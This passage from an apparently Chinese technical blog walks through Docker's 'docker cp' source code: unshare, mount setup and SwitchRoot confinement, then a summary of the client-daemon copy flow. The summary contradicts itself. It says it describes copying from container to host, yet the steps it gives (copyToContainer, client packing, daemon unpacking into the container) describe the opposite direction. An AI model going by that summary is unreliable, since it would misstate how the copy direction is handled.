dest)<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> mounttree.SwitchRoot(container.BaseFS)<br>&#125;,<br></code></pre></td></tr></table></figure><p>该函数进行了一些挂载操作之后使用mounttree.SwitchRoot函数切换到容器的跟文件系统<br>再看第二个函数类型参数</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(done)<br><span class="hljs-keyword">for</span> it := <span class="hljs-keyword">range</span> todo &#123;<br>err := it.fn()<br><span class="hljs-keyword">if</span> it.res != <span class="hljs-literal">nil</span> &#123;<br>it.res &lt;- err<br>&#125;<br>&#125;<br><br>&#125;,<br></code></pre></td></tr></table></figure><p>该函数的主要作用就是获取todo channel中的函数进行执行。<br>最后我们再来看一下unshare.Go具体做了什么</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Go</span><span class="hljs-params">(flags <span class="hljs-type">int</span>, setupfn <span class="hljs-keyword">func</span>()</span></span> <span class="hljs-type">error</span>, fn <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>) <span class="hljs-type">error</span> &#123;<br>...<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>...<br>        <span class="hljs-keyword">if</span> err := unix.Unshare(flags); err != <span class="hljs-literal">nil</span> &#123;<br>started &lt;- os.NewSyscallError(<span class="hljs-string">&quot;unshare&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> setupfn != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err := setupfn(); err != <span class="hljs-literal">nil</span> &#123;<br>started &lt;- err<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-built_in">close</span>(started)<br><br><span class="hljs-keyword">if</span> fn != <span class="hljs-literal">nil</span> &#123;<br>fn()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">return</span> &lt;-started<br>&#125;<br></code></pre></td></tr></table></figure><p>unshare.Go函数先是调用unshare的系统调用创建了一个新的命名空间，然后一次调用第一个函数类型参数和第二个函数类型参数。综上所述，我们可以大致了解docker daemon是如何将一个函数限制在容器文件系统上下文中的了：首先使用unshare系统调用创建一个新的命名空间，将容器的文件挂载进该命名空间，并切换到容器的文件系统中，之后再调用用户想要执行的函数，此时这个函数就被限制在了容器的文件系统上下文中。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>无论是从容器中向宿主机复制文件还是从宿主机向容器复制文件，docker daemon都只负责容器的文件处理部分，docker client都只负责宿主机的文件处理部分，二者通过api接口进行通信，并且docker client和docker daemon的操作是互逆的，即docker client负责打包时，docker daemon则负责解包。<br>简单总结一下docker cp的流程，以从容器向宿主机复制文件为例。当我们使用类似docker cp containerid:containerFile hostDir的命令从容器内部向宿主机复制文件时，此时命令中的docker 实际上是docker client。docker client接受到用户输入的参数后判断出源文件路径和目标文件路径以及传输类型，之后根据传输类型进行不同的处理逻辑。在此例子中会进入到copyToContainer函数进行处理，此时docker client负责将源文件路径的文件进行打包。之后将打包好的文件信息以及容器信息，目标文件路径信息通过接口传递给docker daemon。docker daemon监听api接口发现有request时会根据api接口的不同进入不同的处理逻辑，此例子中，docker daemon会将传输过来的打包好的文件进行解包并将其移动到容器的目标文件路径下。当然这只是简单的描述一下整体的流程，这其中肯定会涉及到很多细节，如链接的处理，容器文件系统和宿主机文件系统的隔离，权限的判定等等。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
